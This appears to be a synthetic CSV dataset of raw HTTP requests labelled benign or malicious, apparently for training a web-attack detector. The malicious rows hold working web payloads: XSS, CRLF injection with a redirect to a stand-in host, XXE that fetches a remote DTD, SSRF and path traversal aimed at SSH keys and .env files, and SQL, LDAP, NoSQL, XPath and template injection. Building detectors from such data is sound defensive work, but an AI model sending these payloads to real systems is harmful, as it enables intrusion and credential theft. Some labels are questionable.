label,text
malicious,"GET /api/v3/items/search?query=shoes%250d%250aSet-Cookie%3A%20promoCode%3DFREE50 HTTP/1.1
Host: fast-track-fulfillment.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"GET /members/<img SrC=x oNeRrOr=prompt(1)>/profile HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /v4/session/info HTTP/1.1
Host: secure-natural-resources.org
App-Secret: 7d4f9c61a8b442d3be1e2f50d6870a93
Accept: application/json
User-Agent: bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Language: en-US,en;q=0.5"
malicious,"PUT /api/v1/update-profile HTTP/1.1
Host: profiles.social-nectar.io
User-Agent: Python-urllib/3.9
Accept: application/json
Content-Type: application/json
Content-Length: 250
X-Requested-With: XMLHttpRequest

{""profile_url"": ""/user/12345%0d%0aCache-Control:%20no-store%0d%0aLocation:%20http://stolen-credentials.social-nectar.io%0d%0a%0d%0a<script>document.location='http://malware.site'</script>""}"
benign,"GET /api/v2/user/session?exec=extend_timeout HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: application/json
Accept-Language: en-GB,en;q=0.9
X-CSRF-Token: AbCdEfGhIjKlMnOp
Connection: keep-alive"
malicious,"GET /api/items/filter?category=electronics&price%5B%24gt%5D=0 HTTP/1.1
Host: shop.online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"GET /blog/posts/welcome-2024 HTTP/1.1
Host: myhobby-writing-space.info
Connection: keep-alive
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Cookie: user_prefs_b64=eyJhcnRpY2xlVGhlbWUiOiJkYXJrIiwiZm9udFNpemUiOjEyLCJsaW5lTGltaXQiOjV9; visitor_id=au2783lmAQZ=
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-F711U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Mobile Safari/537.36"
benign,"POST /api/log HTTP/1.1
Host: api.safe-analytics.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 312
Connection: close
Referer: https://dashboard.safe-analytics.net/app/reports

{""client"":""web"",""session"":{""id"":""a7c23d89-775a-4373-ba7b-0939407f6c4d"",""start"":""2024-06-16T10:11:45Z"",""attributes"":{""browser"":""Safari 16"",""os"":""macOS Catalina""}},""actions"":[{""name"":""login"",""timestamp"":""2024-06-16T10:12:01Z"",""details"":{""success"":true,""method"":""password""}},{""name"":""view_report"",""timestamp"":""2024-06-16T10:15:29Z"",""details"":{""reportId"":112,""filters"":{""dateRange"":""last_7_days"",""metrics"":[""revenue"",""visits""]}}}]}"
benign,"GET /articles/2024/04/benefits-of-ai-in-healthcare HTTP/1.1
Host: innovative-healthtech-solutions.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"GET /ajax/notifications/poll?user=edward&callback=processData HTTP/1.1
Host: members.community-forums.io
Accept: application/javascript
Accept-Language: en-US,en;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
X-Requested-With: XMLHttpRequest
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /articles/2024/05/15 HTTP/1.1
Host: my-personal-blog-site.info
Cookie: blog_conf_b64=eyJ0aGVtZSI6ImRhcmsiLCJmb250U2l6ZSI6MTF9
Accept: text/html
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Connection: keep-alive"
benign,"GET /service/status HTTP/1.1
Host: api.weather-trends.org
Accept: application/json
App-Secret: 7d0ca18fcb2e4bb9aee1656cd80f724a
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Cache-Control: max-age=3600
Connection: keep-alive"
benign,"GET /library/books?id=f7a81ef6-12db-4994-9371-28bc9cbb3dcf HTTP/1.1
Host: knowledge-base.librarycloud.org
Accept: application/xml, text/xml
If-None-Match: ""e0023aa4f""
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Connection: close"
benign,"GET /app/user/settings?data=%7B%22filter%22%3A%22active%22%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.85.0
Accept: */*
Connection: close"
benign,"POST /api/v3/items/search HTTP/1.1
Host: api.cloud-data-services.ai
Connection: close
Content-Type: multipart/form-data; boundary=--Boundary42
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept: application/json
Accept-Language: en-GB,en;q=0.8
Content-Length: 273
Referer: https://api.cloud-data-services.ai/dashboard

----Boundary42
Content-Disposition: form-data; name=""query""

machine learning algorithms
----Boundary42
Content-Disposition: form-data; name=""category""

research
----Boundary42
Content-Disposition: form-data; name=""sortBy""

relevance
----Boundary42
Content-Disposition: form-data; name=""filterActive""

true
----Boundary42--"
malicious,"POST /checkout/payment HTTP/1.1
Host: checkout.payment-gateway.net
User-Agent: Mozilla/5.0 ""><img src=x onerror=eval(atob('YWxlcnQoImZpbmFuY2lhbCBmcmF1ZCkiKQ=='))>
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml
Content-Length: 35
Cache-Control: max-age=0
Origin: https://checkout.payment-gateway.net

card_number=4111111111111111&exp=12/26&cvv=123"
benign,"POST /api/v4/payments/initiate HTTP/1.1
Host: secure-pay-gateway.ai
Content-Type: application/json
Accept: application/json
Origin: https://secure-pay-gateway.ai
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...mXKw
X-CSRF-Token: 2f4c6a5b74f54adcae0aa77acf69b45a
Content-Length: 85

{""paymentMethodId"":8723,""amount"":45.99,""currency"":""USD"",""saveCard"":true}"
benign,"GET /api/v1/users/list?filter[type]=admin&filter[active]=true&sort=created_at HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: curl/7.87.0
Connection: close"
benign,"GET /box/getfile?file=report-final.pdf HTTP/1.1
Host: cloud-storage-company.ai
User-Agent: curl/7.85.0
Accept: */*
X-Forwarded-For: 10.12.45.78
Connection: Keep-Alive"
benign,"GET / HTTP/1.1
Host: reliable-finance-news.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate
Pragma: no-cache
Connection: close"
benign,"POST /user/preferences/save HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Content-Length: 38
Connection: keep-alive
Referer: https://my-personal-blog-site.info/settings

setting=theme&value=dark_mode_enable"
benign,"POST /request-password-reset HTTP/1.1
Host: travel-adventure-hub.travel
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Connection: close

email=daniel.hamilton%40traveladventure.travel"
benign,"POST /api/v2/tickets/submit HTTP/1.1
Host: helpdesk-infra.cloud-data-services.ai
Content-Type: application/json
Accept: application/json
Origin: https://helpdesk-infra.cloud-data-services.ai
Authorization: Bearer eyJhbGcOiJIUzI1NiIsIkpXVCJ9.ghi789jkl012mno345pqr678
X-CSRF-Token: bb7e5d4a9c12f8e91bc3
X-Requested-With: FetchAPIClient
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G996U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Content-Length: 79

{""subject"":""Login Issue"",""priority"":""medium"",""description"":""Cannot reset password via email link.""}"
malicious,"POST /api/xml/data-parser HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/xml
User-Agent: Python-urllib/3.9
Accept-Encoding: identity
Cache-Control: no-cache
Content-Length: 315

<!DOCTYPE user-data [
<!ENTITY % file SYSTEM ""file:///etc/hostname"">
<!ENTITY % ext SYSTEM ""http://xxe-remote-fetch.secure-user-portal.net/xpayload.dtd"">
%ext;
%trigger;
]>
<user-data>
  <info>request payload</info>
</user-data>"
malicious,"GET /api/v2/proxy/file:///root/.ssh/id_rsa HTTP/1.1
Host: private-research-lab-network.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Referer: https://private-research-lab-network.org/tools
Connection: keep-alive"
benign,"GET /forums/topic/39482 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html
DNT: 1
Via: 1.1 proxy.gateway.local
Connection: close"
benign,"GET /search/items?search_term=latest+fitness+tracker+reviews HTTP/1.1
Host: health-tech-reviews.commerce.biz
Accept: text/html
Referer: https://health-tech-reviews.commerce.biz/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept-Language: en-US,en;q=0.8
Connection: close"
benign,"GET /sitemap.xml HTTP/1.1
Host: archive-vault.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/xml, text/xml
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /feeds/latest-news.atom HTTP/1.1
Host: example.com:8080
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: application/atom+xml,application/xml
Accept-Language: *
Connection: close"
malicious,"GET /docs/manual/..%2F..%2F..%2F..%2Fetc/hosts HTTP/1.1
Host: enterprise-file-share.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive"
benign,"POST /files/upload HTTP/1.1
Host: dossier-cloud-service.io
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 624
Cookie: sessionid=7f2512b2314bc66ea8a52d4b

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""document""; filename=""report_final.pdf""
Content-Type: application/pdf

%PDF-1.4
%âãÏÓ
1 0 obj
<< /Type /Catalog >>
endobj

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""description""

Quarterly Financial Report Q2 2024
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""author""

John Marshall
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
malicious,"GET /assets/css/%2e%2e%2f%2e%2e%2f%2e%2e%2fsecrets/.env HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://secure-user-portal.net/app/user/settings"
malicious,"GET /auth/validate?dept=%2A%29%26%26%28objectClass%3D*%29%29%28%7C%28uid%3Dguest%29 HTTP/1.1
Host: employee-database.cloud
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: gzip
Connection: keep-alive"
malicious,"POST /api/v1/feedback HTTP/1.1
Host: interactive-learning-hub.education
Content-Type: application/json
Content-Length: 301
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Origin: https://interactive-learning-hub.education
X-Requested-With: FetchAPIClient
Accept: application/json, text/javascript
Accept-Language: en-US,en;q=0.8

{""courseId"": ""CS101"", ""rating"": 5, ""comments"": ""Great material!"", ""<img src=x onerror=\""eval(String.fromCharCode(0x61,108,0145,114,0x74,40,0x27,88,0x53,0123,45,0x4b,101,0x79,0x27,41))\"">"": ""feedbackFlag"", ""anonymous"": false}"
benign,"GET /v1/api/status HTTP/1.1
Host: secure-user-portal.net
User-Agent: Perl/Dancer2
Accept: application/json, text/plain, */*
Accept-Encoding: gzip
Connection: close"
benign,"GET /review/restaurant/the-golden-spice-12345 HTTP/1.1
Host: gourmetpalate.biz
User-Agent: facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)
Accept: text/html
Accept-Encoding: br,gzip
Connection: close"
benign,"POST /auth/refresh HTTP/1.1
Host: api-authentication.cloud-service.club
Accept: application/json
Content-Type: application/json
X-CSRF-Token: zM7hpG3jDqTRXyN17Ej0x59Q
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Safari/537.36
Content-Length: 36

{""UNION ALL"": ""token_renewal_requested""}"
benign,"HEAD /blog/2024/04/understanding-ai HTTP/1.1
Host: enlighten-tech-innovations.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Referer: https://enlighten-tech-innovations.net/blog/"
malicious,"GET /dashboard/stats HTTP/1.1
Host: elite-financial-data.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: application/json
X-Test-Mode: enable
Cache-Control: max-age=0"
benign,"GET /api/v1/user/profile?callback=processData&id=9843 HTTP/1.1
Host: data-analytics-hub.io
Accept: application/javascript, */*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://data-analytics-hub.io/dashboard
Connection: keep-alive"
benign,"GET /static/v2/css/theme.css?token=eyJhbGciOiJIUzI1NiJ9.MjY5NzF8c2VjdXJlX3Rva2VuX3ZhbHVlfQ.KqrvekQa9s9tCHnnlhbJ-bfPO_WQySqsqCtKBKXMnJs HTTP/1.1
Host: style-resources.docs-cloud.org
Accept: text/css,*/*;q=0.1
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: keep-alive"
benign,"POST /media/upload HTTP/1.1
Host: creative-studio-app.com
Connection: keep-alive
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.154 Mobile Safari/537.36
Content-Type: multipart/form-data; boundary=----BoundaryMobileX12
Content-Length: 2375
Origin: https://creative-studio-app.com
Cache-Control: no-cache

------BoundaryMobileX12
Content-Disposition: form-data; name=""uploads""; filename=""avatar_profile.png""
Content-Type: image/png

(binary data png)
------BoundaryMobileX12
Content-Disposition: form-data; name=""uploads""; filename=""background_image.jpeg""
Content-Type: image/jpeg

(binary data jpeg)
------BoundaryMobileX12
Content-Disposition: form-data; name=""uploads""; filename=""banner.svg""
Content-Type: image/svg+xml

(binary data svg)
------BoundaryMobileX12--"
malicious,"GET /search?q=%26lt%3Bscript%26gt%3Balert%28%26%2339%3BXSS_%20Vulnerability_Found%26%2339%3B%29%26lt%3B%2Fscript%26gt%3B HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Referer: https://secure-user-portal.net/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
malicious,"POST /api/v1/extract HTTP/1.1
Host: secure-data-mine.biz
User-Agent: Python-urllib/3.9
Accept: application/xml
Content-Type: application/xml
Content-Length: 128
Referer: https://secure-data-mine.biz/tools
Connection: close

<searchRequest>
  <term>' or '1'='1' or name()='</term>
  <category>all</category>
</searchRequest>"
benign,"POST /register/user HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Accept: application/json
Origin: https://app.cloud-data-services.ai
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Content-Length: 147
Connection: keep-alive

{""username"":""leroy.simons"",""email"":""leroy.simons@api.cloud-data-services.ai"",""password"":""CleanSky#39"",""profile"":{""firstName"":""Leroy"",""lastName"":""Simons"",""dateOfBirth"":""1991-07-22""}}"
malicious,"POST /api/v1/user/finish-setup HTTP/1.1
Host: digital-media-exchange.org
Content-Type: application/json
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Length: 61
Cookie: track_session=ajs93nd0sjd932nfs0

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /api/v1/users/profile/picture HTTP/1.1
Host: media-cloud-service.io
Authorization: Bearer bdf7249a8f6543ca95d2f476283ab1e3
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Accept-Encoding: gzip, deflate
Connection: keep-alive
Content-Length: 175

{""userId"":12345,""imageData"":""iVBORw0KGgoAAAANSUhEUgAAAAUAAAABCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==""}"
benign,"GET /wiki/Resource_(disambiguation) HTTP/1.1
Host: eco-science-center.net
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /products/list?page=3&sort=price_desc HTTP/1.1
Host: marketplace.global-trade.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Forwarded-Host: evil-tracking-domain.net
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /status HTTP/1.1
Host: secure-api-storage.cloud
User-Agent: NewRelicPinger/1.2.0
Accept: application/json
Connection: close"
benign,"GET /v3/forum/threads/recent?limit=20 HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://community.game-dev-forum.org
Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0"
benign,"GET /api/v4/feedback/entry-159.xml HTTP/1.1
Host: community-reviews-platform.org
Accept: application/xml
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept-Encoding: gzip"
benign,"GET /api/v3/items/search?filter=active&sort=popularity HTTP/1.1
Host: sales-tracker-app.net
Connection: keep-alive
Accept: application/json
Referer: https://analytics.dashboard-platform.ai/user/3295/overview
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate"
benign,"POST /accounts/newsletter/join HTTP/1.1
Host: techinsightsdaily.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
User-Agent: curl/7.79.1
Accept: */*
X-Forwarded-For: 192.168.10.22
Connection: close

email=alice.brown%40techmailservices.ai"
benign,"PUT /api/v1/profiles/3045 HTTP/1.1
Host: profiles.my-personal-blog-site.info
Authorization: Bearer dXNlcmJhc2U6YWJjMTIzNDU2
Content-Type: application/json
Accept: application/json
Referer: https://my-personal-blog-site.info/dashboard
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Content-Length: 156

{""profileId"":3045,""fullName"":""Evelyn Harper"",""bio"":""Lifestyle blogger and photographer."",""website"":""https://evelynharper.blog"",""socialLinks"":{""instagram"":""evelynpics"",""twitter"":""evelynwrites""}}"
benign,"POST /members/profile/edit HTTP/1.1
Host: premium-membership.healthcare
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
Origin: https://premium-membership.healthcare
Referer: https://premium-membership.healthcare/members/profile/edit
Cookie: auth_sid=3289174523abcdef1234567890abcdef
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml
Connection: keep-alive

display_name=Dr.+Nathaniel+Hopkins&bio=Practicing+physician+and+healthcare+advocate.&website_url=https%3A%2F%2Fdrhopkinshealth.org&location=Boston%2C+MA"
benign,"POST /contact/send HTTP/1.1
Host: helpdesk-cloudsolutions.tech
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Origin: https://helpdesk-cloudsolutions.tech
Referer: https://helpdesk-cloudsolutions.tech/contact
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Cookie: sessionid=9f7a2b381c4d2786d4b2a8c914e70829
Connection: keep-alive

name=Lucas+Fisher&email=lucas.fisher%40helpdesk-cloudsolutions.tech&subject=Issue+with+login+page&message=I+am+unable+to+log+in+since+this+morning.+Please+assist."
malicious,"POST /auth/signature-check HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://api.cloud-data-services.ai/
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: close

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"GET /media/gifs/welcome-animation.gif HTTP/1.1
Host: api.cloud-data-services.ai
Accept: image/gif,image/*;q=0.8,application/json;q=0.3
Referer: https://api.cloud-data-services.ai/docs/getting-started
Connection: keep-alive
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
malicious,"POST /checkout/submit HTTP/1.1
Host: secure-order-gateway.internalorder.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
Content-Type: application/json
Accept: application/json
Content-Length: 123
Cache-Control: no-cache

{""cartId"":98756,""paymentMethod"":""credit_card"",""details"":{""cardNumber"":""4111111111111111"",""expiry"":""12/25""}}"
malicious,"POST /contact_us/send HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 172
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/contact_us/
Origin: https://secure-user-portal.net
Cache-Control: no-cache

name=Jessica+Meyer&email=jessica.meyer%40examplemail.com&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: data-insights-pro.io
Content-Type: application/json
Content-Length: 279
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: br, gzip, deflate
Origin: https://app.data-insights-pro.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36

{""user"": {""id"": 112233, ""type"": ""admin""}, ""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""session_timeout"": 30, ""enable_logs"": true}}}}"
benign,"GET /scripts/libs/analytics.js HTTP/1.1
Host: community.game-dev-forum.org
Accept: application/javascript
Referer: https://community.game-dev-forum.org/forums/thread/42
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Connection: keep-alive"
benign,"GET /icons/menu/menu-hamburger.svg HTTP/1.1
Host: community.game-dev-forum.org
Accept: image/svg+xml,image/*;q=0.9
Referer: https://community.game-dev-forum.org/thread/5071/discussion
User-Agent: Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
malicious,"GET /profile/view?name=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: keep-alive"
